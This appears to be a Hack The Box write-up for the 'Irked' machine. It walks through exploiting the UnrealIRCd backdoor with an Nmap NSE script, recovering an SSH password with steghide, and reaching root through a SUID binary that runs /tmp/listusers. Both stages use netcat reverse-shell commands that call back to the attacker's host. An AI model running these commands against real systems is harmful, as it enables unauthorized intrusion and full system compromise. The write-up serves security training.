## Initial Shell

### Testing for Unreal IRC backdoor with Nmap

The Unreal IRC server is known to have a RCE vulnerability, which actually has an Nmap NSE script to check. The command `nmap -d -p6697 --script=irc-unrealircd-backdoor.nse --script-args=irc-unrealircd-backdoor.command='ping -c 5 10.10.14.16' 10.10.10.117` will allow us to test for the RCE with a simple ping back to our own machine, that we can capture with a `tcpdump -i tun0 icmp` listener.

![](/assets/htb-irked/rce_ping_test.png)

```
PORT     STATE SERVICE REASON
6697/tcp open  ircs-u  syn-ack ttl 63
|_irc-unrealircd-backdoor: Looks like trojaned version of unrealircd. See http://seclists.org/fulldisclosure/2010/Jun/277
Final times for host: srtt: 50840 rttvar: 38945  to: 206620
```

We got the pings back in `tcpdump`, so we know the RCE works. This is our way forward.

### Use Nmap NSE script to get reverse shell

While we could look for a pre-built exploit to help us get into the machine, we already have a proven method of RCE with the NSE script. We just need to change the command argument to that of a `nc` reverse shell, and if `nc` is installed (which it is on most modern Unix systems), it should hopefully get us a shell back. The final command would be `nmap -d -p6697 --script=irc-unrealircd-backdoor.nse --script-args=irc-unrealircd-backdoor.command='nc -e /bin/sh 10.10.14.16 7500' 10.10.10.117`. Make sure to start a listener with `nc -lvnp 7500`.

It worked! We just got a reverse shell by using an Nmap NSE script for RCE.

## Privlege Escalation

### Poking around

Now that we're on a shell as `ircd`, we can start poking around to see what we can find on the system. From basic enumeration, we find that the system is Debian 8.1, and the `user.txt` flag is in `/home/djmardov/Documents`, but we don't have permission to read it.

However, there is a file in that same directory called `.backup`, which contians the following text.

```
Super elite steg backup pw
UPupDOWNdownLRlrBAbaSSss
```

Huh, looks like they left a steg password readable to us.

### Steghide

We haven't come across any images yet, except the big face on the web page during enumeration. Let's try grabbing it and seeing if it has some secrets to dump. We can simply download it via `wget http://10.10.10.117/irked.jpg`.

Now that it's local, let's use `steghide` to find out if there's some hidden data inside.

The command to grab the information about the stego file is `steghide info irked.jpg`. NOte that the passphrase is the password we found in the `.backup` file.

![](/assets/htb-irked/steg_info.png)

Looks like there's a file called `pass.txt` hidden inside. Let's extract it with `steghide extract -sf irked.jpg`. 

![](/assets/htb-irked/steghide_extract.png)

It worked! The `pass.txt` file is ours now.

### SSH as user and grab flag

Our new password is likely the SSH password for `djmardov`. Let's try to login using `ssh djmardov@10.10.10.117`, with our new password.

![](/assets/htb-irked/djmardov_ssh.png)

We're in! Time to grab `user.txt`.

![](/assets/htb-irked/user_proof.png)

### Enumerate for escalation

Now that we have a solid TTY shell, we can start looking for our path to `root`.

I like the [Linux Smart Enumeration script](https://github.com/diego-treitos/linux-smart-enumeration), as it breaks down the results in an easy to understand way. Note that for the detailed report, run `./lse.sh -l1`. Make sure you enter the password when prompted, as it will give you more information.

When the script runs, we can see the list of binaries with SUID bits has an entry for `/usr/bin/viewuser`. 

![](/assets/htb-irked/find_suid_viewuser.png)

If we try to run it, we get the following:

![](/assets/htb-irked/viewuser_listusers_not_found.png)

Looks like it's a custom application to list permissions for users. Let's download it and check it out a bit deeper.

If we run the binary locally through `ltrace ./viewuser`, we can see that it actually executes the contents of `/tmp/listusers`, which currently doesn't exist on the target system. Since the SUID bit it set, it will run `viewuser` as `root`. Since it's calling `/tmp/listusers` from a `root` session, it should give us a `root` shell if we stick a nice payload in `/tmp/listusers`.

![](/assets/htb-irked/ltrace_viewuser.png)

### Make the listusers file and root shell

We can add a simple reverse shell to the `/tmp/listusers` file on the system with `echo "nc -e /bin/bash 10.10.14.16 7600" >> /tmp/listusers`. Don't forget to make the `/tmp/listusers` file executable with `chmod +x /tmp/listusers`.

Open a listener with `nc -lvnp 7600` to catch the shell.

Now run `viewusers` again from your SSH shell, and you should get a `root` shell back on your listener.

![](/assets/htb-irked/root_shell.png)

It worked! Let's grab `root.txt`.
